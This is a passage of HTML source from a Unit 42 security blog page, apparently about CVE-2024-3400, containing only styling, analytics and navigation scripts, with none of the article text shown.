.wp-block-co-authors-plus-avatar :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-avatar :where(img){vertical-align:middle}.wp-block-co-authors-plus-avatar:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-avatar.aligncenter{display:table;margin-inline:auto}

</style>
<style id='co-authors-plus-image-style-inline-css'>
.wp-block-co-authors-plus-image{margin-bottom:0}.wp-block-co-authors-plus-image :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-image :where(img){vertical-align:middle}.wp-block-co-authors-plus-image:is(.alignfull,.alignwide) :where(img){width:100%}.wp-block-co-authors-plus-image:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-image.aligncenter{display:table;margin-inline:auto}

</style>
<style id='safe-svg-svg-icon-style-inline-css'>
.safe-svg-cover{text-align:center}.safe-svg-cover .safe-svg-inside{display:inline-block;max-width:100%}.safe-svg-cover svg{height:100%;max-height:100%;max-width:100%;width:100%}

</style>
<style id='classic-theme-styles-inline-css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='post-views-counter-frontend-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.min.css?ver=1.4.7' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.min.css?ver=1' media='all' />
<link rel='stylesheet' id='unit42-v6-style-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/style.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-head-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/head-styles.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v5-custom-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/main.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-plugin-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/plugin.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-custom-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/main-redesign.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='like-dislike-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/css/ldc-lite.css?ver=1.0.0' media='all' />
<script src="https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script src="https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script id="crayon_js-js-extra">
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta" id="crayon_js-js"></script>
<script id="post-views-counter-frontend-js-before">
var pvcArgsFrontend = {"mode":"js","postID":133365,"requestURL":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","nonce":"eb3082173d","dataStorage":"cookies","multisite":false,"path":"\/","domain":""};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/js/frontend.min.js?ver=1.4.7" id="post-views-counter-frontend-js"></script>
<script id="wpml-xdomain-data-js-extra">
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en","_nonce":"d42e909e7d"};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.6.13" id="wpml-xdomain-data-js" defer data-wp-strategy="defer"></script>
<link rel="https://api.w.org/" href="https://unit42.paloaltonetworks.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://unit42.paloaltonetworks.com/wp-json/wp/v2/posts/133365" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=133365' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.6.13 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
			padding-top:0px;
			padding-bottom:0px;
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>      <script src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script>
<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.0.1/es5/tex-mml-chtml.js"></script>
<link rel="icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" sizes="32x32" />
<link rel="icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" />
<meta name="msapplication-TileImage" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" />
<script>var $ = jQuery;</script>

    <script type="text/javascript">
    ;(function(win, doc, style, timeout) {
    var STYLE_ID = 'at-body-style';
    function getParent() {
    return doc.getElementsByTagName('head')[0];
    }
    function addStyle(parent, id, def) {
        if (!parent) {
        return;
        }
        var style = doc.createElement('style');
        style.id = id;
        style.innerHTML = def;
        parent.appendChild(style);
    }
    function removeStyle(parent, id) {
        if (!parent) {
            return;
        }
        var style = doc.getElementById(id);
        if (!style) {
            return;
        }
        parent.removeChild(style);
    }
    addStyle(getParent(), STYLE_ID, style);
    setTimeout(function() {
    removeStyle(getParent(), STYLE_ID);
    }, timeout);
    }(window, document, "body {visibility:hidden !important}", 3000));
    </script>

            <script src="https://assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
            <script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>


<script type="text/javascript">
var isIE11 = !!navigator.userAgent.match(/Trident.*rv\:11\./);
if(isIE11){
    var polyfill = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/scripts/polyfill.min.js';
    document.write('<script type="text/javascript" src="'+polyfill+'">\x3C/script>');
}
    /**
 * String.prototype.replaceAll() polyfill
 * https://gomakethings.com/how-to-replace-a-section-of-a-string-with-another-one-with-vanilla-js/
 * @author Chris Ferdinandi
 * @license MIT
 */
if (!String.prototype.replaceAll) {
	String.prototype.replaceAll = function(str, newStr){
		// If a regex pattern
		if (Object.prototype.toString.call(str).toLowerCase() === '[object regexp]') {
			return this.replace(str, newStr);
		}
		// If a string
		return this.replace(new RegExp(str, 'g'), newStr);
	};
}

    /*! lozad.js - v1.16.0 - 2020-09-06 */
!function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):t.lozad=e()}(this,function(){"use strict";
/**
   * Detect IE browser
   * @const {boolean}
   * @private
   */var g="undefined"!=typeof document&&document.documentMode,f={rootMargin:"0px",threshold:0,load:function(t){if("picture"===t.nodeName.toLowerCase()){var e=t.querySelector("img"),r=!1;null===e&&(e=document.createElement("img"),r=!0),g&&t.getAttribute("data-iesrc")&&(e.src=t.getAttribute("data-iesrc")),t.getAttribute("data-alt")&&(e.alt=t.getAttribute("data-alt")),r&&t.append(e)}if("video"===t.nodeName.toLowerCase()&&!t.getAttribute("data-src")&&t.children){for(var a=t.children,o=void 0,i=0;i<=a.length-1;i++)(o=a[i].getAttribute("data-src"))&&(a[i].src=o);t.load()}t.getAttribute("data-poster")&&(t.poster=t.getAttribute("data-poster")),t.getAttribute("data-src")&&(t.src=t.getAttribute("data-src")),t.getAttribute("data-srcset")&&t.setAttribute("srcset",t.getAttribute("data-srcset"));var n=",";if(t.getAttribute("data-background-delimiter")&&(n=t.getAttribute("data-background-delimiter")),t.getAttribute("data-background-image"))t.style.backgroundImage="url('"+t.getAttribute("data-background-image").split(n).join("'),url('")+"')";else if(t.getAttribute("data-background-image-set")){var d=t.getAttribute("data-background-image-set").split(n),u=d[0].substr(0,d[0].indexOf(" "))||d[0];// Substring before ... 1x
u=-1===u.indexOf("url(")?"url("+u+")":u,1===d.length?t.style.backgroundImage=u:t.setAttribute("style",(t.getAttribute("style")||"")+"background-image: "+u+"; background-image: -webkit-image-set("+d+"); background-image: image-set("+d+")")}t.getAttribute("data-toggle-class")&&t.classList.toggle(t.getAttribute("data-toggle-class"))},loaded:function(){}};function A(t){t.setAttribute("data-loaded",!0)}var m=function(t){return"true"===t.getAttribute("data-loaded")},v=function(t){var e=1<arguments.length&&void 0!==arguments[1]?arguments[1]:document;return t instanceof Element?[t]:t instanceof NodeList?t:e.querySelectorAll(t)};return function(){var r,a,o=0<arguments.length&&void 0!==arguments[0]?arguments[0]:".lozad",t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{},e=Object.assign({},f,t),i=e.root,n=e.rootMargin,d=e.threshold,u=e.load,g=e.loaded,s=void 0;"undefined"!=typeof window&&window.IntersectionObserver&&(s=new IntersectionObserver((r=u,a=g,function(t,e){t.forEach(function(t){(0<t.intersectionRatio||t.isIntersecting)&&(e.unobserve(t.target),m(t.target)||(r(t.target),A(t.target),a(t.target)))})}),{root:i,rootMargin:n,threshold:d}));for(var c,l=v(o,i),b=0;b<l.length;b++)(c=l[b]).getAttribute("data-placeholder-background")&&(c.style.background=c.getAttribute("data-placeholder-background"));return{observe:function(){for(var t=v(o,i),e=0;e<t.length;e++)m(t[e])||(s?s.observe(t[e]):(u(t[e]),A(t[e]),g(t[e])))},triggerLoad:function(t){m(t)||(u(t),A(t),g(t))},observer:s}}});

</script>

<!-- <script src="https://www.google.com/recaptcha/api.js"></script>  -->

<!--  End: Scripts Migrated From Unit42-v5 -->

    </head>
<body class="post-template-default single single-post postid-133365 single-format-standard no-sidebar">
<header class="haeder py-15 position-relative z-index-2" style="display: none;">
  <div class="container px-sm-30 px-35">
    <div class="row">
        <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                        <a href="https://www.paloaltonetworks.com/">
                <img src="/wp-content/uploads/2021/07/PANW_Parent.png" width="140px" alt="Logo" />
            </a>
        </div>
      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/">
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/unit42-logo-white.svg" class="attachment-full size-full" alt="Unit42 Logo"  width="150" height="35"/>
        </a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search" aria-label="search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required aria-label="Inner Search">
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10"  style="display: none!important;">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-119884" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-119884"><a target="_blank" rel="noopener" href="https://www.paloaltonetworks.com/unit42">Security Consulting</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
<li id="menu-item-121229" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-121229"><a href="https://start.paloaltonetworks.com/contact-unit42.html"><b style="color:#C84727">Under Attack?</b></a></li>
</ul>  </div>
</nav>
<div class="panClean pan-template-home" id="main-nav-menu-cont" style="display:none;">
    <div class="cleanHeader mainNavigationComp baseComponent parbase">
        <div class="productNav2021Component dark default" id="PAN_2021_NAV_ASYNC">
        </div>
  </div>
<div class="cleanTopHtml htmlComp baseComponent parbase"><div class="base-component-spacer spacer-none  "></div>
</div>
</div>
<!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
	function getCookie(cname) {
	 	var name = cname + "=";
  		var decodedCookie = decodeURIComponent(document.cookie);
		var ca = decodedCookie.split(';');
  		for(var i = 0; i <ca.length; i++) {
    			var c = ca[i];
    			while (c.charAt(0) == ' ') {
     				 c = c.substring(1);
    			}
    			if (c.indexOf(name) == 0) {
    				 return c.substring(name.length, c.length);
    			}
  		}
  		return "";
	}

	var referer = "";//sessionStorage.container;
	var pcontainer = sessionStorage.getItem("container");
	var searchResultsPagePath = "";
	if(((pcontainer) && pcontainer.indexOf('Prisma')!=-1)){
	    referer = 'Prisma' ;
	}
        else if(((pcontainer) && pcontainer.indexOf('Cortex')!=-1)){
	    referer = 'Cortex' ;
	}
        else if(((pcontainer) && pcontainer.indexOf('Sase')!=-1)){
	    referer = 'Sase' ;
	}
	else if(((pcontainer) && pcontainer.indexOf('Unit')!=-1)){
	    referer = 'Unit' ;
	}
	else if(((pcontainer) && pcontainer.indexOf('Ngfw')!=-1)){
	    referer = 'Ngfw' ;
	}
        var fromRef = document.referrer;
        var nContainer = getCookie("navContainer");
        if(nContainer){//If user is coming from main site, we need to reset the container		
		if(fromRef  && fromRef.indexOf("prismacloud.io")!=-1){
                        referer = 'Prisma' ;
                        sessionStorage.setItem("container","Prisma");
                } else if(fromRef.indexOf("paloaltonetworks.com")!=-1 || fromRef.indexOf("paloaltonetworks.jp")!=-1 ){
                        if(nContainer.indexOf('Prisma') != -1){
                            referer = 'Prisma' ;
                            sessionStorage.setItem("container","Prisma");
                        }
                        if(nContainer.indexOf('Cortex') != -1){
                            referer = 'Cortex' ;
                            sessionStorage.setItem("container","Cortex");
                        }
			if(nContainer.indexOf('Sase') != -1){
                            referer = 'Sase' ;
                            sessionStorage.setItem("container","Sase");
                        }
			if(nContainer.indexOf('Unit') != -1){
                            referer = 'Unit' ;
                            sessionStorage.setItem("container","Unit");
                        }
			if(nContainer.indexOf('Ngfw') != -1){
                            referer = 'Ngfw' ;
                            sessionStorage.setItem("container","Ngfw");
                        }
			document.cookie = 'navContainer=; path=/; domain=.paloaltonetworks.com; expires=' + new Date(0).toUTCString();
		}
	}
if(referer != "Prisma" && referer != "Cortex" && referer != "Sase" && referer != "Unit" && referer != "Ngfw") {
    referer = 'Unit' ;
    sessionStorage.setItem("container","Unit");
}
function callMainSitePrismaNavHTML(){
    
    var referrer_domain = 'https://www.paloaltonetworks.com';
    sessionStorage.setItem("domain",referrer_domain);
    if(referer == 'Prisma'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderPrisma.prismaRenderer.html';
        searchResultsPagePath = referrer_domain+"/search/prismasearch";
        }
    if(referer == 'Cortex'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderCortex.cortexRenderer.html';	
        searchResultsPagePath = referrer_domain+"/search/cortexsearch";	
    }
    if(referer == 'Sase'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderSase.saseRenderer.html';
        searchResultsPagePath = referrer_domain+"/search/sasesearch";
    }
    if(referer == 'Unit'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/unit-nav-renderer.php';
        searchResultsPagePath = referrer_domain+"/content/pan/en_US/search/unit42search";
		    }
    if(referer == 'Ngfw'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/ngfw-cdss-nav-renderer.php';
        searchResultsPagePath = referrer_domain+"/search/ngfwcdsssearch";
    }
    httpGet(menu_url,'menu_html');
    document.getElementById('main-nav-menu-cont').removeAttribute("style");
}
function addStyle(styles) {            
    /* Create style document */
    var css = document.createElement('style');
    css.type = 'text/css';

    if (css.styleSheet) 
        css.styleSheet.cssText = styles;
    else 
        css.appendChild(document.createTextNode(styles));

    /* Append style to the tag name */
    document.getElementsByTagName("head")[0].appendChild(css);
}
function httpGet(theUrl,req_type) {
    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp=new XMLHttpRequest();
    } else {// code for IE6, IE5
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            if(req_type == 'menu_html'){
            var nav_text = xmlhttp.responseText.replaceAll('https://static.cloud.coveo.com/searchui/v2.9159/js/CoveoJsSearch.Lazy.min.js', '');
            nav_text = nav_text.replaceAll('src="/', 'src="'+maindomain_lang+'/');
            nav_text = nav_text.replaceAll("'/content", "'"+maindomain_lang+"/content");
                        
            document.getElementById("PAN_2021_NAV_ASYNC").innerHTML = nav_text.replaceAll('href="/', 'href="'+maindomain_lang+'/');

            var lozad_back = document.getElementsByClassName('lozad-background');
            Array.prototype.forEach.call(lozad_back, function(el) {
            // Do stuff here
            var el_back_img_path = el.getAttribute('data-background-image');
            var first_pos = el_back_img_path.indexOf("'");
            var last_pos = el_back_img_path.indexOf("'",first_pos+1);
            el_back_img_path = el_back_img_path.substring(first_pos+1,last_pos);
            el.setAttribute("data-background-image",main_site_url+el_back_img_path);
            });
            }
            if(req_type == 'head_inline_css'){
            addStyle(xmlhttp.responseText);
            }
        }
    }
    xmlhttp.open("GET", theUrl, true );
    xmlhttp.send();    
}    
    
if(referer == 'Prisma' || referer == 'Cortex' || referer == 'Sase' || referer == 'Unit' || referer == 'Ngfw'){
    const article = document.querySelector('#PAN_2021_NAV_ASYNC');
    if(referer == 'Prisma'){
        article.dataset.type = 'prisma';
        $('#PAN_2021_NAV_ASYNC').removeClass('default').addClass('defaultRedesigned');
    }
